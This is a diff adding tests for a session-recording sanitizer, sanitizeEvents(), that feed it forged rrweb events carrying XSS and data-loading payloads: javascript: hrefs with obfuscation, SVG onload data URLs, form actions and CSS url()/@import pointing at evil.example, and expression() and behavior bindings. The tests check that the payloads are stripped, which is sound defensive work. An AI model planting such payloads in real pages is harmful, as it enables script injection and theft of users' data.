@@ -557,3 +557,107 @@ describe("sanitizeEvents: snapshots and mutations", () => {
     ).not.toThrow();
   });
 });
+
+/**
+ * The review of 18 November 2026: hostile inputs of every kind a forged recording could carry, each run through `sanitizeEvents()`, and
+ * nothing that points at another host or a script scheme survives. Attribute values in a snapshot are already decoded strings (rrweb sets
+ * them with `setAttribute`, which decodes nothing), so entity-encoded schemes stay inert text.
+ */
+describe("a forged recording's attacks (review, 18 November 2026)", () => {
+  const leaks = (out: unknown) => {
+    const text = JSON.stringify(out).toLowerCase();
+    return ["evil.example", "javascript:", "vbscript:", "data:text/html", "data:image/svg+xml"].filter((bad) => text.includes(bad));
+  };
+  const inBody = (node: unknown) => [snapshot([], [node])];
+  const attrs: [string, Record<string, unknown>][] = [
+    ["a", { href: "javascript:alert(1)" }],
+    ["a", { href: "JaVaScRiPt:alert(1)" }],
+    ["a", { href: "java\tscript:alert(1)" }],
+    ["a", { href: " \u0001javascript:alert(1)" }],
+    ["a", { href: "//evil.example/x" }],
+    ["a", { href: "/\\evil.example/x" }],
+    ["a", { href: "\\\\evil.example\\x" }],
+    ["a", { href: "https:evil.example" }],
+    ["iframe", { src: "data:text/html,<script>alert(1)</script>" }],
+    ["iframe", { srcdoc: "<script>alert(1)</script>" }],
+    ["img", { src: "https://evil.example/p.gif" }],
+    ["img", { srcset: "https://evil.example/a.png 1x, data:image/png;base64,AAAA 2x" }],
+    ["img", { src: "data:image/svg+xml,<svg onload=alert(1)>" }],
+    ["svg:use", { "xlink:href": "https://evil.example/s.svg#a" }],
+    ["use", { href: "//evil.example/s.svg#a" }],
+    ["animate", { attributeName: "href", to: "javascript:alert(1)", values: "javascript:alert(1)" }],
+    ["set", { attributeName: "href", to: "https://evil.example" }],
+    ["base", { href: "https://evil.example/" }],
+    ["meta", { "http-equiv": "refresh", content: "0;url=https://evil.example" }],
+    ["link", { rel: "stylesheet", href: "//evil.example/s.css" }],
+    ["link", { rel: "prefetch", href: "https://evil.example/" }],
+    ["object", { data: "https://evil.example/x.swf" }],
+    ["embed", { src: "https://evil.example/x.swf" }],
+    ["form", { action: "https://evil.example/steal" }],
+    ["button", { formaction: "https://evil.example/steal" }],
+    ["video", { poster: "https://evil.example/p.jpg", src: "https://evil.example/v.mp4" }],
+    ["div", { onclick: "alert(1)", OnMouseOver: "alert(1)" }],
+    ["div", { style: "background:url(https://evil.example/x)" }],
+    ["div", { "data-x": "https://evil.example/" }],
+    ["canvas", { rr_dataURL: "https://evil.example/c.png" }],
+  ];
+
+  it.each(attrs)("drops what %s's attributes would load or run: %j", (tag, attributes) => {
+    const out = sanitizeEvents(inBody(el(10, tag, attributes)), ALLOWED);
+    expect(leaks(out)).toEqual([]);
+  });
+
+  const css = [
+    "@import url(https://evil.example/a.css);",
+    '@import "https://evil.example/a.css";',
+    "@import '//evil.example/a.css' screen;",
+    "a{background:\\75 rl(https://evil.example/x)}",
+    "a{background:u\\rl(https://evil.example/x)}",
+    "a{background:url(/*x*/https://evil.example/x)}",
+    "a{background:url( https://evil.example/x )}",
+    "a{background:image-set(url(https://evil.example/x) 1x)}",
+    'a{background:-webkit-image-set("https://evil.example/x" 1x)}',
+    "a{background:cross-fade(url(https://evil.example/x),red)}",
+    '@font-face{font-family:x;src:url(https://evil.example/f.woff2)}',
+    "a{width:expression(alert(1));background:url(javascript:alert(1))}",
+    "a{-moz-binding:url(https://evil.example/x.xml#b)}",
+    "a{behavior:url(https://evil.example/x.htc)}",
+    "@media screen{@supports (display:grid){a{background:url(//evil.example/x)}}}",
+    "@supports (background:url(https://evil.example/probe)){a{color:red}}",
+  ];
+
+  it.each(css)("drops a style sheet's outside address: %s", (text) => {
+    const out = sanitizeEvents(inBody(el(10, "style", { _cssText: text })), ALLOWED);
+    expect(leaks(out)).toEqual([]);
+  });
+
+  it("drops outside addresses from every incremental source that carries CSS, fonts, canvas, media or custom data", () => {
+    const evil = "url(https://evil.example/x)";
+    const events = [
+      { type: 3, timestamp: 1, data: { source: 8, id: 7, adds: [{ rule: `a{background:${evil}}`, index: 0 }] } },
+      { type: 3, timestamp: 2, data: { source: 8, id: 7, replace: `a{background:${evil}}` } },
+      { type: 3, timestamp: 3, data: { source: 8, id: 7, replaceSync: `@import ${evil};` } },
+      { type: 3, timestamp: 4, data: { source: 13, id: 7, set: { property: "background", value: evil, priority: "" } } },
+      { type: 3, timestamp: 5, data: { source: 15, id: 7, styles: [{ styleId: 1, rules: [{ rule: `a{background:${evil}}` }] }], styleIds: [1] } },
+      { type: 3, timestamp: 6, data: { source: 10, family: "x", fontSource: `url(https://evil.example/f.woff2)`, buffer: false } },
+      { type: 3, timestamp: 7, data: { source: 9, id: 7, type: 0, commands: [{ property: "drawImage", args: [{ rr_type: "HTMLImageElement", src: "https://evil.example/i.png" }, 0, 0] }] } },
+      { type: 3, timestamp: 8, data: { source: 0, adds: [{ parentId: 5, nextId: null, node: el(20, "img", { src: "https://evil.example/m.png" }) }], removes: [], texts: [{ id: 6, value: `a{background:${evil}}` }], attributes: [{ id: 5, attributes: { style: { background: evil }, href: "javascript:alert(1)" } }] } },
+    ];
+    expect(leaks(sanitizeEvents(events, ALLOWED))).toEqual([]);
+  });
+
+  it("keeps no SVG data address outside CSS, where a frame, an object or a link could run it; CSS still draws one as a picture", () => {
+    const svg = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>";
+    for (const [tag, name] of [["iframe", "src"], ["object", "data"], ["embed", "src"], ["a", "href"], ["link", "href"], ["img", "src"], ["use", "href"]]) {
+      expect(leaks(sanitizeEvents(inBody(el(10, tag, { [name]: svg })), ALLOWED)), `${tag} ${name}`).toEqual([]);
+    }
+    expect(leaks(sanitizeEvents(inBody(el(10, "canvas", { rr_dataURL: svg })), ALLOWED))).toEqual([]);
+    expect(sanitizeCssText("a{background:url(\"data:image/svg+xml,<svg/>\")}", ALLOWED)).toContain("data:image/svg+xml");
+    expect(JSON.stringify(sanitizeEvents(inBody(el(10, "img", { src: "data:image/png;base64,AAAA" })), ALLOWED))).toContain("data:image/png;base64,AAAA");
+  });
+
+  it("drops a style sheet nested too deep instead of overflowing the stack", () => {
+    const out = sanitizeEvents(inBody(el(10, "style", { _cssText: "a{".repeat(50_000) })), ALLOWED);
+    expect(out).toHaveLength(1);
+  });
+});
